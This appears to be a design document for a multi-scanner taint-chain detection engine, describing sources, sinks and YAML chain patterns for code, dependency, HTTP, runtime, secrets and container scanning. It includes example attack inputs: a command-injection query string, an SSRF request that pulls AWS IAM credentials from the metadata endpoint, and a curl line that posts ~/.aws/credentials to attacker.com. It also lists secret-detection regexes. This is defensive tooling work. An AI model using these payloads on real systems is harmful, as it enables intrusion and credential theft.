# Scanner Type Coverage

The engine is not a single SAST scanner — it is a **chain detection layer** that operates across all scanner types. Each scanner type contributes sources, sinks, and STORE/LOAD nodes to the shared taint graph. Chains can cross scanner type boundaries (e.g., a vulnerable SCA dependency produces a tainted value that flows into a SAST code injection sink).

---

## SAST — Static Application Security Testing

**What it scans:** Source code (TypeScript, JavaScript, Python, Go, Java)

**Sources:**
- Environment variables (`process.env.*`)
- CLI arguments (`process.argv`, `argv.*`)
- File reads from variable paths
- HTTP request inputs (`req.body.*`, `req.query.*`)

**Sinks:**
- OS command execution (`execa`, `execSync`, `subprocess.run`)
- Code evaluation (`eval`, `new Function`, `vm.runInNewContext`)
- Dynamic require/import (`require(variable)`)
- File writes to sensitive paths (STORE nodes)

**Chain patterns:**
- `env-injection-to-shell` — env var → template literal → shell exec
- `file-path-injection` — filename → double-quoted shell arg → POSIX command substitution
- `config-write-to-exec` — tainted write to config → loaded and executed next session

**Key capability:** Cross-session STORED_FLOW detection. Most SAST tools stop at the file boundary. This engine follows tainted data through `fs.writeFile → fs.readFile` pairs across files and sessions.

---

## SCA — Software Composition Analysis

**What it scans:** `package.json`, `requirements.txt`, `go.mod`, `pom.xml`, lock files

**Sources:**
- Vulnerable dependency version (known CVE in installed package)
- Dependency that exports a tainted API surface
- Transitive dependency that reaches execution code

**Sinks:**
- Anywhere the vulnerable package's exports reach a shell or eval sink
- Package scripts (`npm run X` where X is attacker-influenced)
- `postinstall` / `preinstall` hooks in `package.json`

**Chain patterns:**

```yaml
id: sca-vulnerable-dep-to-exec
description: >
  A dependency with a known RCE CVE is imported and its vulnerable method
  is called with user-controlled input.

source:
  type: SCA_DEP
  package: affected-package@<2.1.0
  cve: CVE-XXXX-YYYY

sink:
  type: SHELL_EXEC
  via: affected-package exported method

chain_with: any SAST chain that uses the package output
```

```yaml
id: sca-postinstall-injection
description: >
  Attacker-controlled package.json scripts.postinstall value executes
  on npm install. Used in supply chain attacks.

source:
  type: SCA_PKG_SCRIPT
  field: scripts.postinstall / scripts.preinstall

sink:
  type: SHELL_EXEC
  trigger: npm install
```

**What to scan:**
1. Compare all installed versions against NVD / OSV / GitHub Advisory Database
2. For packages with RCE CVEs — trace where their exports are called
3. Check `package.json` scripts fields for injection patterns
4. Flag transitive deps that reach execution sinks

---

## DAST — Dynamic Application Security Testing

**What it scans:** Running HTTP endpoints via instrumented requests

**Sources:**
- HTTP request parameters (`GET ?cmd=`, `POST body.input`)
- HTTP headers (`X-Forwarded-For`, `User-Agent`, custom headers)
- URL path segments (`/api/v1/:userInput`)
- Cookie values
- WebSocket messages

**Sinks:**
- OS command execution triggered by HTTP handler
- SSRF (server-side request to attacker-controlled URL)
- Path traversal leading to file read/write
- SQL/NoSQL injection
- Template injection (SSTI)

**Chain patterns:**

```yaml
id: dast-http-to-shell
description: >
  HTTP request parameter flows through handler into shell-executed command.

source:
  type: HTTP_INPUT
  location: req.query.target / req.body.command

transforms:
  - assignment
  - template literal

sink:
  type: SHELL_EXEC

chain_example: |
  GET /api/scan?target=google.com%3Btouch+/tmp/pwned
  → handler: execSync(`nmap ${req.query.target}`)
```

```yaml
id: dast-ssrf-chain
description: >
  User-controlled URL reaches an internal fetch — enables pivoting to
  internal metadata endpoints (AWS IMDS, GCP metadata, etc.)

source:
  type: HTTP_INPUT
  location: req.body.url

sink:
  type: NETWORK_FETCH
  target: internal_host (169.254.169.254, 10.x.x.x, etc.)

chain_example: |
  POST /webhook { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
  → fetch(req.body.url)  → AWS credentials returned to attacker
```

**DAST-specific scanning approach:**
- Instrument the application at runtime (not static AST)
- Inject payloads into all HTTP parameters
- Monitor for out-of-band DNS/HTTP callbacks (OAST)
- Track data flow through the runtime call stack

---

## IAST — Interactive Application Security Testing

**What it scans:** Application at runtime via instrumentation hooks

**How it differs from DAST:** IAST instruments the application code itself (not just the HTTP layer). It observes actual data flow during test execution.

**Sources:**
- Any runtime value that originated from an external input (HTTP, file, env)
- Tracked via runtime taint propagation (not static analysis)

**Sinks:**
- Same as SAST but observed at runtime — no false positives from unreachable code paths

**Chain patterns (runtime variants):**

```yaml
id: iast-runtime-env-to-exec
description: >
  At runtime, process.env.X is observed flowing through 3 function calls
  before reaching execa(). The intermediate calls are not detectable
  from static analysis alone — only visible at runtime.

source:
  type: RUNTIME_ENV_VAR
  observed_at: runtime

transforms:
  - observed_call_stack: [getTerminal(), formatCmd(), runCmd()]

sink:
  type: SHELL_EXEC
  observed_at: runtime

note: >
  IAST confirms SAST findings and finds chains that cross dynamic dispatch
  boundaries (virtual method calls, callback chains, event emitters).
```

**IAST integration approach:**
- Use OpenTelemetry or APM agent to instrument function calls
- Tag values at source (env/HTTP/file read)
- Propagate tag through all operations
- Alert when tagged value reaches sink

---

## Secrets Scanning

**What it scans:** All files for hardcoded secrets AND for patterns that exfiltrate secrets

**Sources (secret values):**
- Hardcoded API keys, tokens, passwords in source files
- Secrets in `.env` files committed to git
- Secrets in CI/CD configuration files
- Secrets in Dockerfile `ENV` directives

**Sinks (where secrets flow):**
- Network requests to external hosts (exfiltration)
- Log statements (leakage)
- Error messages returned to users (leakage)
- Written to files readable by other processes

**Chain patterns:**

```yaml
id: secrets-hardcoded-to-log
description: >
  Hardcoded API key flows into a log statement — logged to stdout or
  a log aggregator accessible to attackers.

source:
  type: HARDCODED_SECRET
  pattern: sk-ant-[a-zA-Z0-9]{40,}|AKIA[A-Z0-9]{16}|ghp_[a-zA-Z0-9]{36}

sink:
  type: LOG_STATEMENT
  pattern: console.log(*) / logger.info(*) / logger.debug(*)
```

```yaml
id: secrets-env-to-network-exfil
description: >
  Secret from environment variable reaches an outbound HTTP request
  to an attacker-controlled domain. Used in dependency confusion attacks.

source:
  type: ENV_VAR
  pattern: process.env.AWS_SECRET_ACCESS_KEY / process.env.ANTHROPIC_API_KEY

sink:
  type: NETWORK_EXFIL
  target: non-allowlisted external host

chain_with: config-write-to-exec (secret exfiltrated via apiKeyHelper)
```

**Detection approach:**
- Regex patterns for known secret formats (entropy-based + pattern-based)
- Allowlist known safe contexts (test fixtures, example values)
- Track secret values through assignments into sinks
- Check git history for accidentally committed secrets

---

## Container / IaC Scanning

**What it scans:** Dockerfile, docker-compose.yml, Helm charts, Terraform, Kubernetes manifests

**Sources:**
- `ENV` directives in Dockerfile (attacker-controlled if built with `--build-arg`)
- `ARG` values passed at build time
- Helm values files (`values.yaml`)
- Kubernetes ConfigMap / Secret values
- Terraform variables

**Sinks:**
- `ENTRYPOINT` / `CMD` that uses ENV value without sanitization
- `RUN` commands that interpolate ARG values
- Kubernetes command/args that reference ConfigMap values

**Chain patterns:**

```yaml
id: docker-build-arg-to-entrypoint
description: >
  Docker build ARG value flows into ENTRYPOINT command via ENV.
  Attacker who controls build args controls what runs in the container.

source:
  type: DOCKER_BUILD_ARG
  directive: ARG TERMINAL_APP

store:
  type: DOCKER_ENV
  directive: ENV TERMINAL_APP=${TERMINAL_APP}

sink:
  type: DOCKER_ENTRYPOINT
  pattern: ENTRYPOINT ["sh", "-c", "${TERMINAL_APP}"]
```

```yaml
id: helm-values-to-container-command
description: >
  Helm values.yaml field flows into container command args.
  Attacker who supplies values.yaml controls container execution.

source:
  type: HELM_VALUES
  path: .Values.command

sink:
  type: K8S_CONTAINER_ARGS
  path: spec.containers[].command
```

**IaC scanning approach:**
- Parse manifests as structured data (not code AST)
- Track variable references from `ARG/ENV → CMD/ENTRYPOINT`
- Check for privileged container configs (escalation chains)
- Flag secrets stored in plaintext (not as K8s Secrets or sealed-secrets)

---

## Cross-Scanner Chains

The most dangerous chains cross scanner type boundaries:

```
SCA vulnerable dep  →  SAST injection sink  →  Secrets exfil
     ↓                        ↓                      ↓
 package.json          execa({shell:true})      curl POST attacker.com
 lodash@<4.17.21       in application code      -d "$(cat ~/.aws/credentials)"
```

```
Container IaC        →  SAST config file  →  Runtime DAST
     ↓                        ↓                    ↓
 Dockerfile ENV          settings.json         HTTP endpoint
 injects TERMINAL        written with          triggers stored
 at build time           malicious helper      payload
```

The engine merges findings across all scanner types into a single taint graph. Cross-scanner edges are flagged explicitly in the output.

---

## Scanner Adapter Interface

Each scanner type implements the same interface:

```typescript
interface ScannerAdapter {
  type: ScannerType   // 'sast' | 'sca' | 'dast' | 'iast' | 'secrets' | 'container'
  findSources(target: ScanTarget): Promise<SourceNode[]>
  findSinks(target: ScanTarget): Promise<SinkNode[]>
  findStorePaths(target: ScanTarget): Promise<StorePath[]>
}
```

The `TaintGraph` merges nodes from all adapters before running chain discovery. This is what enables cross-scanner chains.
